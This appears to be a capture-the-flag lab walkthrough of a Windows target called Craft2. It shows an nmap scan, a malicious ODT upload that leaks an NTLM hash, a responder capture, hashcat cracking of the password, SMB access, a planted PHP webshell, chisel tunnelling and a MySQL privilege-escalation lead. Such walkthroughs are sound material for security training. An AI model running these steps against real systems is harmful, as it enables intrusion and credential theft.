## NMAP

```nmap-craft2
?$ nmap -sC -sV 192.168.51.188 -oA Craft1 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-05 18:12 UTC
Nmap scan report for 192.168.51.188
Host is up (0.00093s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
80/tcp  open  http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-title: Craft
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
135/tcp open  msrpc         Microsoft Windows RPC
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-07-05T18:13:06
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.86 seconds
```

## Port 80

Found a file upload
only takes ODT files
Using burpsuite to try to mask php file
Not possible this way

need to upload an odt file with a malicious macro

used 44564.py which makes a bad ODF file that can disclose NTLM hash

Used responder to capture:

```responder
sudo responder -I eth0
```

```responder-capture
[*] [NBT-NS] Poisoned answer sent to 192.168.49.51 for name __MSBROWSE__ (service: Browser)                                                               
[SMB] NTLMv2-SSP Client   : 192.168.51.188
[SMB] NTLMv2-SSP Username : CRAFT2\thecybergeek
[SMB] NTLMv2-SSP Hash     : thecybergeek::CRAFT2:1e4436d4a2ee02a2:EB852C09DAE230F8E1C5831F3D148C70:01010000000000008017D4717FD0DA018C7243798D70D6BF00000000020008003400550043004E0001001E00570049004E002D0046004C004D0051003500590051005100580056004E0004003400570049004E002D0046004C004D0051003500590051005100580056004E002E003400550043004E002E004C004F00430041004C00030014003400550043004E002E004C004F00430041004C00050014003400550043004E002E004C004F00430041004C00070008008017D4717FD0DA01060004000200000008003000300000000000000000000000003000003380270BB72B20B073ED5FD677E080912672F408860026D722A789B73161EB420A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E00340039002E00350031000000000000000000     
```

Use Hashcat to crack this:

```hashcat-ntlm
hashcat -m 5600 <hashes.txt> <wordlist.txt>
```

```
Host memory required for this attack: 3 MB                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              Dictionary cache built:                                                                                                 * Filename..: /usr/share/wordlists/rockyou.txt                                                                          * Passwords.: 14344392                                                                                                  * Bytes.....: 139921507                                                                                                 * Keyspace..: 14344385                                                                                                  * Runtime...: 2 secs                                                                                                                                                                                                                            THECYBERGEEK::CRAFT2:1e4436d4a2ee02a2:eb852c09dae230f8e1c5831f3d148c70:01010000000000008017d4717fd0da018c7243798d70d6bf00000000020008003400550043004e0001001e00570049004e002d0046004c004d0051003500590051005100580056004e0004003400570049004e002d0046004c004d0051003500590051005100580056004e002e003400550043004e002e004c004f00430041004c00030014003400550043004e002e004c004f00430041004c00050014003400550043004e002e004c004f00430041004c00070008008017d4717fd0da01060004000200000008003000300000000000000000000000003000003380270bb72b20b073ed5fd677e080912672f408860026d722a789b73161eb420a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e00340039002e00350031000000000000000000:winniethepooh                                                                                                                                                                                                                                               Session..........: hashcat                                                                                              Status...........: Cracked                                                                                              Hash.Mode........: 5600 (NetNTLMv2)                                                                                     Hash.Target......: THECYBERGEEK::CRAFT2:1e4436d4a2ee02a2:eb852c09dae23...000000                                         Time.Started.....: Sun Jul  7 11:17:26 2024 (0 secs)                                                                    Time.Estimated...: Sun Jul  7 11:17:26 2024 (0 secs)                                                                    Kernel.Feature...: Pure Kernel                                                                                          Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)                                                              Guess.Queue......: 1/1 (100.00%)                                                                                        Speed.#1.........:    88447 H/s (1.65ms) @ Accel:512 Loops:1 Thr:1 Vec:8                                                Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)                                           Progress.........: 6144/14344385 (0.04%)                                                                                Rejected.........: 0/6144 (0.00%)                                                                                       Restore.Point....: 0/14344385 (0.00%)                                                                                   Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1                                                                   Candidate.Engine.: Device Generator                                                                                     Candidates.#1....: 123456 -> iheartyou                                                                                                                                                                                                          Started: Sun Jul  7 11:16:48 2024                                                                                       Stopped: Sun Jul  7 11:17:27 2024 
```

```credentials-1
thecybergeek
winniethepooh
```

## SMB

Able to login to WebApp share using smbclient

```
??$ smbclient -U 'thecybergeek' \\\\192.168.51.188\\WebApp 
Password for [WORKGROUP\thecybergeek]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Apr  5 16:16:03 2022
  ..                                  D        0  Tue Apr  5 16:16:03 2022
  assets                              D        0  Tue Apr  5 16:16:03 2022
  css                                 D        0  Tue Apr  5 16:16:03 2022
  index.php                           A     9768  Mon Jan 31 16:21:52 2022
  js                                  D        0  Tue Apr  5 16:16:03 2022
  upload.php                          A      896  Mon Jan 31 15:23:02 2022
  uploads                             D        0  Sun Jul  7 15:09:45 2024

                10327807 blocks of size 4096. 1779143 blocks available
smb: \> 
```

Put Ivan Seneck webshell to the share using put command

Ran listener and then opened shell.php on website

```shell-1
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs>whoami
craft2\apache
```

Logged in as craft2\\apache user

Ran netstat to find port 3306 accessible

```netstat
C:\xampp\htdocs>netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       2108
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       876
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       2108
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       1756
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       504
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       356
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1000
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       644
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       668
```

Use [chisel](https://github.com/jpillora/chisel) to access this directly from kali/attacker machine

forwarded locally open port 80 for phpmyadmin to 8090 on localhost

This allows using phpmyadmin to hit mysql db

SQL can write as root so we can use privileged file write to elevate:

[Privileged File Write](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#wertrigger)
